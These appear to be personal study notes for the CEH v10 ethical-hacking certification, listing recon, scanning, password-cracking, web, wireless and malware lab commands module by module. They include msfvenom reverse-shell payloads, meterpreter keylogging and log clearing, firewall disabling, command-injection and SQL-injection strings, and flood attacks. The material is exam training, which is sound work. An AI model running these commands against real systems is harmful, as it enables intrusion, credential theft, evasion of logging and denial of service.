# CEH v10

### Module 2&#x20;

```
Ping, nslookup: determine IP, DNS info, TTL
Ping -f -l length
Ping -i hops -n 1
Discover subdomains with: sublist3r -d domain -t threads -e engine -p port
Pipl.com, inspy for fingerprinting employees
Web Scraping or web Data Mining with Web Data Extracting (emails, phones..)
Mirror a site with HTTrack
eMailTrackerPro  to track mails geolocation, copying Original Message (or Email header in Outlook) from email.
smartWhois for IP and DNS info
Path analyzer pro for tracert and DNS info
Maltego ofc
Recon-ng for host brute and reporting, and persons info, images related to a location
FOCA analyze network info and public documents
OSRFramework: usufy.py -n nicknames -p plataforms || searchfy.py -q pagename or handler name
Nmap -Pn -sS -A
db_nmap -sS -A
Search portscan
Use scanner/smb/smb_version
nmap --script smb-os-discovery.nse -p445 127.0.0.1
Theharvester -d domain -l 300 -b all -f file
```

### Module 3&#x20;

```
ARP scanning with Colasoft
Hping3 -c numberOfPackets IP || hping3 --scan 1-x -S IP || hping3 IP -udp -rand-source --data 500 || -p port -s SYN, --flood
Megaping
Slow Comprehensive Scan in nmap for machines that do not respond to ping
Null scan -sN
Discover DHCP servers with NetSanTools - Manual tools
IP-Tools to retrieve list of machine names and UDP scans
Nmap -sT -T3 -A for connect() || nmap -sU -T5 || nmap -sX -T4 || idle: nmap -Pn -sI -p port
Tracert -h maximum hops
Evasion: Nmap -f for fragmented || nmap -D RND:10 will send scan from 10 different Ips || nmap -mtu 8, maximum transmission unit
Daisy Chaining: turn off Windows SmartScreen in security -> proxyWorkbench pwb, install proxy different machines and forward traffic through it
Proxy switcher, cyberGhost

TTL in wireshark (or ping obv)
Diagrams with Solarwind´s Orion
```

### Module 4

```
Global Network Inventory: credentialed info
Advanced IP Scanner :D 
SuperScan - Windows Enumeration - Null Sessions
Hyena - Local info, such as chrons
NetBIOS Enumerator
Nbtstat -A IP, netbios info
Net use: shared folders from host
Nmap -sS Stealthy, -sSV -O enumerates versions of services
Nmap -sU -p 161 --script=snmp-brute
Auxiliary/scanner/snmp/snmp_login, snmp_enum for users
ADExplorer for AD
Enum4linux -u user -p pass IP, -o para OS, -P for pass policy, -G group, -S share
```

### Module 5

```
Nessus: turn offf Ping remote host, port scanning > Verify open TCP ports …, max no. TCP sessions per host and scan to Unlimited.
GFI LAN Guard
Nikto -h host -Tuning x
Nikto -h host -Cgidirs all
```

### Module 6

```
Responder -I eth0
/usr/share/responder/logs
John path

Wmic useraccount get name,sid to get usernames
Pwdump7.exe > c:\hashes.txt to get hashes, then merge both creds
Ophcrack > PWDUMP file > tables

Winrtgen to generate rainbowtables
Min 4, max 6, chain 4mil, charset loweralpha
Rainbowcrack: rcrack_gui.exe

L0phtCrack, no calibrations, yes to LC7

Msfvenom -p windows/meterpreter/reverse_tcp --plataform windows -a x86 -f exe LHOST=attack-machine LPORT=444 -o /root/Desktop/Test.exe
Mkdir /var/www/html/share
Chmod -R 755 /var/www/html/share
Chown -R www-data:www-data /var/www/html/share
Service apache2 start
Use multi/handler
Set payload windows/meterpreter/reverse_tcp
Sessions -i 1
 sysinfo
Run vnc

Msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST= -f exe > Desktop/Exploit.exe
Exploit -j -z
Run post/windows/gather/smart_hashdump
Getsystem -t 1
Background
Use exploit/windows/local/bypassuac_fodhelper
Set SESSION 1
Set payload windows/meterpreter/reverse_tcp
clearev

Fatrat > 6 > 3 > payload > 3 > 8 > 7 > 2 > y > path-to-exe > 3
Multi/handler

Getuid
Timestomp file -v
Search -f "filename"
Keyscan_start
Keyscan_dump
Idletime

Spytech SpyAgent pass spytech
PowerSpy

Hidding in NTFS: type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
Mklink backdoor.exe readme.txt:calc.exe

Snow
Snow -C  -m "text-to-hide" -p "magic" readme.txt readme2.txt
Snow -C -P "magic" readme2.txt

openStego for hide and extract
quickStego

Covert_tcp.c
Cc -o covert_tcp covert_tcp.c in both machines dest and og
Tcpdump -nvvX port 8888 -I lo
Receiver: ./covert_tcp -dest ip -source ip -source_port x -dest_port y -server -file receive.txt
Transmitter: ./covert_tcp -dest ip -source ip -source_port x -dest_port y  -file message.txt
Tcp in Wireshark filter, RST do not contain message

Auditpol /get /category:*
To enable policies: auditpol /set /category:"system", "account logon" /success:enable /failure:enable
Auditpol /clear /y
```

### Module 7

```
njRAT

Virustotal.com
swayzCryptor.exe > startup, mutex, disable UAC
MoSucker > CreateServer

JPSvirusMaker

IDA for dissasembling viruses. View > Graphs > Flow Chart

OllyDBG

Currports when RAT running on victim

Regshot

WinPatrol

TCPView
Autoruns
```

### Module 8

```
Http.request.method == "POST"
Edit > find packet > packet Details > Narrow > String > pwd

Services > Remote Packet Capture Protocol

Wireshark > Preferences > ARP > Detect arp storms, detect duplicates 
Analyze > expert information

Xarp for ARP Spoofing
```

### Module 9

```
Detecting phishing Netcraft
Phishtank

Social engineering toolkit > no > 1 > 2 > 3 > 2 > LHOST > url
```

### Module 10

```
Auxiliary/dos/tcp/synflood, SHOST
Hping3 -S victim -a attacker -p x --flood

HOIC
Hping3 -d 100 -S -p 21 --flood ip
```

### Module 11

```
Bettercap -X -I eth0 -T ip --proxy -P POST 
```

### Module 12

```
Snort
HoneyBOT

Nmap -v -sS -f --mtu 32 --send-eth --data-length 50 --source-port 99 -T5 ip

Meterpreter: execute -f cmd.exe -c -H > shell > netsh firewall show opmode
Netsh advfirewall set allrprofiles state off
```

### Module 13

```
Skipfish -o path -S /usr/share/skipfish/dictionaries/complete.wl url
Uniscan -u url -q, -we instead of q for robots, etc, -d for dynamic
Hydra -L usernames.txt -P passwords.txt ftp:// ip
```

### Module 14

```
Wpscan -u url --enumerate vp
Wpscan -u url --enumerate u

Use auxiliary/scanner/http/wordpress_login_enum > passfile, rhosts, rport, targeturi, usename
Wp-login.php

DVWA: | hostname, |whoami, |taklist,|taskkill /PID x /F, |dir c:\, |net user, |net user Test /Add, |net localgroup Administrators Test /Add 

Msfvenom -p php/meterpreter/reverse_tcp lhost=x lport=x -f raw (copy without /*)
Multi/handler > set payload php/meterpreter/reverse_tcp
Create same file as .php.jpg, in burp, intercept and remove jpg when loaded
|copy file1.jpeg file1.php

Acunetix, vega
```

### Module 15

```
Blah';insert into login values ('john','apple');--
Blah';create database mydatabase;--
Blah'; exec master..xp_cmdshell 'ping x -l 65000 -t';--

Sqlmap -u "url.aspx?id=1" --cookie="document.cookie value copied in web console" -dbs
Sqlmap -u "url.aspx?id=1" --cookie="document.cookie value copied in web console" -D moviescope --tables
Sqlmap -u "url.aspx?id=1" --cookie="document.cookie value copied in web console" -D moviescope -T User_Login -columns
Sqlmap -u "url.aspx?id=1" --cookie="document.cookie value copied in web console" -D moviescope -T User_Login --dump
Sqlmap -u "url.aspx?id=1" -cookie="document.cookie value copied in web console" --os-shell
```

### Module 16

```
Fake auth: aireplay-ng -9 -e SSID -a MAC interface, for test
Airodump-ng --bssid MAC -c 7 -w out interface
aireplay-ng -3 -b AP MAC -h client interface
Aireplay-ng -1 0 -e SSID -a AP MAC -h client MAC interface
Aircarck wepfile, #Data 15000-20000

Airodump-ng --bssid mac -c channel -w out interface
Aireplay-ng -0 2 -a AP MAC -c client MAC interface
Aircrack-ng -a2 -b MAC target -w wordlist file
```

### Module 17

```
Msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik lhost=x R > as.apk
Set payload android/meterpreter/reverse_tcp

The fat rat to an existing apk
```

### Module 19

```
Owncloud
Msfvenom -p linux/x86/shell/reverse_tcp lhost= lport= --platform linux -f elf > exploit.elf

Slowloris.pl, chmod 777 in module 10 kali
./slowloris.pl -dns IP

```

### Module 20

```
Md5calculator for files

Windows administrative tools > Internet Information Services Manager > cancel > server certificates > create self signed certficate
Sites>site>Bindings

Veracrypt: create volume > encrypted file container > standrt > aes sha 512 > 2 MB > Fat cluster default > check random pool
Select file >mount
```

#### [https://github.com/khanhnnvn/CEHv10](https://github.com/khanhnnvn/CEHv10)

####

